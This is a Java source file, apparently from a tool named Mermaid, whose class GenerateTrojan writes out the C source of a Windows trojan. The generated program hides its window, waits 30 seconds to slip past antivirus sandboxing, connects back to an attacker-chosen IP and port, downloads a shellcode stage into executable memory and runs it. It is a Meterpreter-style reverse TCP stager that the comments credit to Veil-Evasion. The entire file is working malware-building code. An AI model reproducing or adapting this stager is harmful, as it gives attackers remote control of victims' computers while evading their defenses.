package net.jlxip.mermaid;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class GenerateTrojan {
    public GenerateTrojan(File trojan, String IP, String PORT){     // FUNCIÓN PARA GENERAR EL PAYLOAD
        try{
            BufferedWriter writer = new BufferedWriter(new FileWriter(trojan)); // Abrimos el archivo recibido por argumentos para escribir en él
            // ESCRIBIMOS EL PAYLOAD
            // CORTESÍA DE VEIL-EVASION ( https://goo.gl/BF0evF )
            // ME TIRÉ UN PUTO DÍA DE-OFUSCANDO EL CÓDIGO DE SU PAYLOAD "c/meterpreter/reverse_tcp"
            writer.write("#define _WIN32_WINNT 0x0500\n");  // Establecemos _WIN32_WINNT a 0X0500 para poder ocultar la ventana
            writer.write("#include <winsock2.h>\n");    // Incluímos la librería "winsock2.h"
            writer.write("#include <stdio.h>\n");       // Incluímos la librería "stdio.h"
            writer.write("#include <string.h>\n");      // Incluímos la librería "string.h"
            writer.write("#include <stdlib.h>\n");      // Incluímos la librería "stdlib.h"
            writer.write("#include <time.h>\n");        // Incluímos la librería "time.h"
            writer.write("#include <windows.h>\n");     // Incluímos la librería "windows.h"
            writer.write("void CloseSocketError(SOCKET recvSocket) {\n");   // Función para cerrar el programa si falla algo (¡Borra las pruebas, Jhonny!)
            writer.write("	closesocket(recvSocket);\n");   // Cerramos el socket recibido por argumentos
            writer.write("	WSACleanup();\n");      // Limpiamos el WSA
            writer.write("	exit(1);\n");       // Salimos marcando que ha habido un error
            writer.write("}\n");
            writer.write("main() {\n");     // Función Main
            writer.write("	ShowWindow( GetConsoleWindow(), SW_HIDE );\n");     // Ocultamos la ventana
            writer.write("	int retTime = time(0) + 30;\n");    // Esperamos 20 segundos para evitarnos el DeepScreen de AVAST y similares...
            writer.write("	while(time(0)<retTime);\n");        // Mientras no haya acabado el tiempo, no hace nada.
            
            writer.write("      char* IP = \""+IP+"\";\n");   // Creamos una cadena de carácteres con la IP/DNS elegida en el perfil
            writer.write("      int PORT = "+PORT+";\n");     // Creamos una variable entera con el puerto
            
            writer.write("	ULONG32 length;\n");    // Creamos una variable ULONG32 con la longitud
            writer.write("	char * shellcode;\n");  // Creamos una cadena de carácteres para almacenar posteriormente el shellcode
            writer.write("	WORD wVersionRequested = MAKEWORD(2, 2);\n");   // Creamos una variable WORD con la versión de SOCKET necesaria
            writer.write("	WSADATA wsaData;\n");   // Creamos un nuevo WSADATA
            writer.write("	if (WSAStartup(wVersionRequested, &wsaData) < 0) {\n"); // Si la versión no es la requerida...
            writer.write("		WSACleanup();\n");  // Limpiamos el WSA
            writer.write("		exit(1);\n");       // Cerramos marcando que ha ocurrido un error
            writer.write("	}\n");
            writer.write("	struct hostent * ConnectionSocket_HOST;\n");    // Creamos una variable con el HOST remoto
            writer.write("	struct sockaddr_in ConnectionSocket_PORT;\n");  // Creamos una variable con el puerto remoto
            writer.write("	SOCKET ConnectionSocket;\n");   // Creamos un nuevo socket
            writer.write("	ConnectionSocket = socket(AF_INET, SOCK_STREAM, 0);\n");    // Lo inicializamos
            writer.write("	if (ConnectionSocket == INVALID_SOCKET){\n");   // Si es inválido...
            writer.write("		CloseSocketError(ConnectionSocket);\n");    // Recurrimos a CloseSocketError
            writer.write("	}\n");
            writer.write("	ConnectionSocket_HOST = gethostbyname(IP);\n"); // Obtenemos el HOST mediante el nombre de dominio
            writer.write("	if (ConnectionSocket_HOST == NULL){\n");    // Si no se puede resolver IP/DNS
            writer.write("		CloseSocketError(ConnectionSocket);\n");    // Recurrimos de nuevo a CloseSocketError
            writer.write("	}\n");
            writer.write("	memcpy(&ConnectionSocket_PORT.sin_addr.s_addr, ConnectionSocket_HOST->h_addr, ConnectionSocket_HOST->h_length);\n");    // Establecemos el HOST en el socket (creo, en realidad no tengo ni idea de qué ocurre). Perdón de nuevo :S
            writer.write("	ConnectionSocket_PORT.sin_family = AF_INET;\n");    // Ponemos el tipo de conexión
            writer.write("	ConnectionSocket_PORT.sin_port = htons(PORT);\n");  // Establecemos el puerto
            writer.write("	if ( connect(ConnectionSocket, (struct sockaddr *)&ConnectionSocket_PORT, sizeof(ConnectionSocket_PORT)) ){\n");    // Si ocurre algún error...
            writer.write("		CloseSocketError(ConnectionSocket);\n");    // Recurrimos a CloseSocketError
            writer.write("	}\n");
            writer.write("	int received = recv(ConnectionSocket, (char *)&length, 4, 0);\n");  // Recibimos una "confirmación"
            writer.write("	if (received != 4 || length <= 0){\n"); // Si lo recibido es distinto a 4 o menor que 0...
            writer.write("		CloseSocketError(ConnectionSocket);\n");    // Recurrimos a CloseSocketError
            writer.write("	}\n");
            writer.write("	shellcode = VirtualAlloc(0, length+5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"); // Preparamos la variable para almacenar el shellcode
            writer.write("	if (shellcode == NULL){\n");    // Si después de lo de arriba, se encuentra nula...
            writer.write("		CloseSocketError(ConnectionSocket);\n");    // Recurrimos a CloseSocketError
            writer.write("	}\n");
            writer.write("	shellcode[0] = 0xBF;\n");   // Escribimos el primer byte de la shellcode
            writer.write("	memcpy(shellcode + 1, &ConnectionSocket, 4);\n");   // Copiamos la shellcode
            writer.write("	int lastByte=0;\n");    // Creamos una variable entera con el último byte leído
            writer.write("	int currentByte=0;\n"); // Creamos una variable entera con el byte actual
            writer.write("	void * startb = shellcode + 5;\n"); // Guardamos el byte inicial de la shellcode
            writer.write("	while (currentByte < length) {\n"); // Mientras el byte actual sea menor al tamaño... (recorremos)
            writer.write("		lastByte = recv(ConnectionSocket, (char *)startb, length - currentByte, 0);\n");    // Establecemos el último byte a uno recibido
            writer.write("		startb += lastByte;\n");    // Sumamos el último byte al byte inicial
            writer.write("		currentByte += lastByte;\n");   // Sumamos el último byte al byte actual
            writer.write("		if (lastByte == SOCKET_ERROR) {\n");    // Si el último byte contiene un error de socket
            writer.write("			CloseSocketError(ConnectionSocket);\n");    // Recurrimos a CloseSocketError
            writer.write("		}\n");
            writer.write("	}\n");
            writer.write("	void (*LaunchShellcode)() = (void(*)())shellcode;\n");  // Preparamos el método para lanzar la shellcode
            writer.write("	LaunchShellcode();\n"); // Y por último... ¡Lanzamos la shellcode!
            writer.write("	return 0;\n");  // Cuando finalize la shellcode (probablemente por un cierre en el cliente) cerramos el payload
            writer.write("}\n");
            writer.close(); // Cerramos el archivo
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
